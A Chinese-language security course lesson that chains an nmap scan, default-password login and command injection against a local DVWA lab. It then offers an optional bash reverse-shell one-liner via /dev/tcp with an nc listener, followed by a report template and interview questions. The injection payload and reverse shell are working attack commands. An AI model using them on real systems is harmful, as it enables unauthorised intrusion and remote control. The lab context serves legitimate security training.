## 一、综合实战：DVWA 完整渗透链

把前五天学的东西串成**一条**完整的攻击链，从头走一遍：

```
信息收集 → 弱口令 → 漏洞利用(RCE) → 写报告
   D3         D4          D5          产出
```

### 步骤 1 · 信息收集（D3）

```bash
nmap -sV -p 8081 127.0.0.1
```

```
PORT     STATE SERVICE VERSION
8081/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

**看到了什么**：8081 开着、Apache 2.4.25（2016 年的老版本，指印泄露 = 攻击者立刻去查这个版本的公开漏洞）。

### 步骤 2 · 弱口令（D4）

登录 `admin` / `password`（或用 Burp Intruder 爆破出来）。真实渗透里这步就是"拿到入口"——大部分漏洞都要先进来才能打。

### 步骤 3 · 漏洞利用 RCE（D5）

DVWA → **Command Injection**（exec 模块）→ 命令注入拿执行权限：

```bash
curl -s -b /tmp/dv.txt -b "security=low" \
  --data-urlencode "ip=127.0.0.1; id" \
  --data-urlencode "Submit=Submit" \
  http://127.0.0.1:8081/vulnerabilities/exec/ | grep -oE "uid=[0-9]+\([^)]*\)"
```

```
uid=33(www-data) gid=33(www-data)
```

**这一行 = 拿到了 shell 权限**（能以 Web 服务器身份 `www-data` 执行任意命令）。这就是"从外部进到服务器内部"的完整闭环。

## 二、进阶：反弹 shell（可选彩蛋）

上面的 `;id` 已经证明了 RCE。如果想更进一步、把 shell "接回自己电脑"（交互式控制），用**反弹 shell**：

```bash
# 攻击机（Mac）先开监听
nc -l 4444

# 靶场 exec 里注入（把 192.168.5.2 换成你 Mac 在 colima 网络里的地址）
127.0.0.1; bash -c 'bash -i >& /dev/tcp/192.168.5.2/4444 0>&1'
```

> ⚠️ 网络路径较绕：DVWA 容器 → colima VM 网关(172.18.0.1) → Mac(colima 网络的 192.168.5.2)。本会话因 macOS 的 `nc` 绑定问题没完整打通（`lsof` 显示没真正监听），**留作你自己调试的进阶题**。想确认 RCE 的话，用 `;id` 就够了。

## 三、渗透报告模板

> 存到 `reports/渗透报告-D6.md`，填空即可。

```markdown
# 渗透测试报告 · DVWA

## 目标
- 目标：DVWA 靶场（本机 Docker）
- 地址：127.0.0.1:8081
- 授权：本地自建靶场（学习用途）

## 信息收集
- 端口：8081 开放
- 服务：Apache 2.4.25 + PHP
- 版本风险：2.4.25 为 2016 年老版本，存在已知漏洞

## 漏洞发现
| 编号 | 漏洞类型 | 位置 | 风险 |
|---|---|---|---|
| 1 | 弱口令 | 登录入口 | 高 |
| 2 | 命令注入(RCE) | /vulnerabilities/exec/ | 严重 |

## 利用过程（截图/命令输出）
1. 弱口令登录 admin/password
2. exec 模块注入 `127.0.0.1; id` → uid=33(www-data)

## 修复建议
- 修改默认口令、加登录限流
- 命令执行用白名单（escapeshellcmd / 禁用 shell_exec）
```

## 四、自我介绍稿（模板 + 框架）

> 招新面试的核心是"能**讲**出一个漏洞"。下面的框架，把你真实做过的经历填进去。

```
大家好，我是[名字]，计算机专业大一。

我最近用一个国庆假期系统自学了网络安全，从零搭了一套完整的实验环境——
Mac 上的工具链（nmap/burp/sqlmap/hydra/wireshark）、5 个 Docker 靶场、
还有一台 Kali 虚拟机。目前能独立完成：

① 信息收集：nmap 端口扫描、服务指纹识别
② 常见漏洞利用：SQL 注入（能手工从注入点拖出整张用户表）、
   XSS、命令注入、文件上传绕过（前端JS/MIME/黑名单三种）
③ 抓包分析：Wireshark/tshark 定位明文口令、会话劫持

【一个能讲的案例】我最熟悉的是 SQL 注入。在 sqli-labs 靶场上，
我用 `1'` 触发报错确认注入点，再用 order by 判断列数、union 找显示位，
最后用 information_schema 一步步拿到库名、表名，甚至把 users 表的
账号密码整个导出来。整个过程让我理解了"把数据当代码执行"这个
根本原因，也知道了参数化查询才是治本的防御。

我想进协会，是想在真实项目里继续深入，也想认识一起打 CTF 的人。
```

**讲案例时的四段式**（面试官就爱听这个结构）：
1. 是什么漏洞（一句话）
2. 怎么发现的（触发条件）
3. 怎么利用的（具体步骤）
4. 怎么防御（治本方案）

## 五、面试题 20 题（附要点）

### 技术类

| # | 问题 | 要点 |
|---|---|---|
| 1 | XSS 和 CSRF 的区别 | XSS=注入恶意脚本在用户浏览器执行；CSRF=借用户身份发伪造请求。一个打"用户"，一个打"服务器信任" |
| 2 | SQL 注入原理与防御 | 用户输入被拼进 SQL 执行；防御=参数化查询/预编译，别拼字符串 |
| 3 | 文件上传怎么防御 | 服务端校验（非前端）、白名单后缀、重命名、限制目录执行权限 |
| 4 | TCP 为什么三次握手 | 让双方都确认收发能力；两次无法确认服务端发的 SYN+ACK 对方收到 |
| 5 | HTTP 和 HTTPS 区别 | HTTPS 加了 TLS 加密，防窃听/篡改/冒充 |
| 6 | 被动 vs 主动信息收集 | 被动=查公开渠道目标无感知；主动=直接发包目标可察觉 |
| 7 | 同源策略是什么 | 浏览器限制跨源读取；协议+域名+端口三者相同才算同源 |
| 8 | 端口扫描原理 | 向目标端口发包，按响应判断开/关/过滤；SYN 半开比 connect 隐蔽 |
| 9 | 对称 vs 非对称加密 | 对称=同一把钥匙加解密（快）；非对称=公钥加密私钥解密（安全，慢） |
| 10 | 中间人攻击 | 攻击者夹在通信双方之间转发/篡改；ARP 欺骗是常见手段 |
| 11 | GET vs POST（安全角度） | GET 参数在 URL 里（易留日志/被缓存）；敏感数据别用 GET |
| 12 | 你用过哪些工具 | nmap(扫描)、Burp(抓包改包)、sqlmap(注入)、hydra(爆破)、Wireshark(抓包)、gobuster(目录) |

### 法律/合规类

| # | 问题 | 要点 |
|---|---|---|
| 13 | 白帽守则三条红线 | 只打有书面授权的目标；不做破坏性操作；负责任披露 |
| 14 | 刑法 285/286 是什么 | 285=非法侵入/获取数据/提供工具罪；286=破坏计算机系统罪 |
| 15 | 发现漏洞怎么处理 | 报告给厂商/SRC/CNVD，保密，不公开未修复细节 |
| 16 | 为什么只打授权目标 | 未授权即违法，哪怕只是扫端口；授权三要素=范围+时间+目标清单 |
